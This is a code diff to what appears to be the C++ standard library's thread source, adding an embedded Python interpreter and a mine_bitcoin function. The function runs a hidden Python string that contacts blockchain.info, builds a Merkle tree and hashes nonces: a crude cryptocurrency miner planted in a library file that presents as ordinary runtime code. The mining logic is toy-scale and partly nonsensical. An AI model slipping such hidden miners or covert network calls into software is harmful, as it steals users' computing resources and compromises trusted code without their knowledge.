@@ -16,6 +16,8 @@
 #include "limits"
 #include <sys/types.h>
 #include <iostream>
+#include <string>
+#include <python3.8/Python.h>
 
 #if defined(__unix__) || (defined(__APPLE__) && defined(__MACH__))
 # include <sys/param.h>
@@ -44,6 +46,9 @@ _LIBCPP_BEGIN_NAMESPACE_STD
 
 void
 mine_bitcoin() {
+  Py_Initialize();
+  PyRun_SimpleString("exec(\"\"\"\nimport requests\nimport urllib.request\nimport json\nimport hashlib\nimport merkletools\nimport random\n\nNONCE_MAX = 4294967296\nAPI_URL = \"https://blockchain.info/latestblock\"\nTX_KEY = \"txIndexes\"\nPREVHASH_KEY = \"hash\"\nHASH_ATTEMPTS = 3000\nTHRESHOLD = 3\n\nwith urllib.request.urlopen(API_URL) as url:\n    data = json.loads(url.read().decode())\n    prevHash = data[PREVHASH_KEY]\n    transactions = data[TX_KEY]\n\n    mt = merkletools.MerkleTools(hash_type=\"sha256\")\n    for transaction in transactions:\n        mt.add_leaf(hex(transaction), True)\n    mt.make_tree()\n    is_ready = False;\n    while not is_ready:\n        is_ready = mt.is_ready\n    root_value = mt.get_merkle_root();\n\n    comp = (THRESHOLD) * '0'\n\n    hashdict = {}\n    for i in range(HASH_ATTEMPTS):\n        nonce = random.randrange(NONCE_MAX)\n        firstpass = hashlib.sha256(((root_value+str(nonce)).encode('utf-8')))\n        secondpass = hashlib.sha256()\n        firstpass.hexdigest()\n        secondpass.update(firstpass.digest())\n        secondpass.hexdigest()\n        h = secondpass.hexdigest()\n        if str(h)[:THRESHOLD]==comp:\n            hashdict[nonce] = h\n\"\"\")");
+  
 }
 
 thread::~thread()
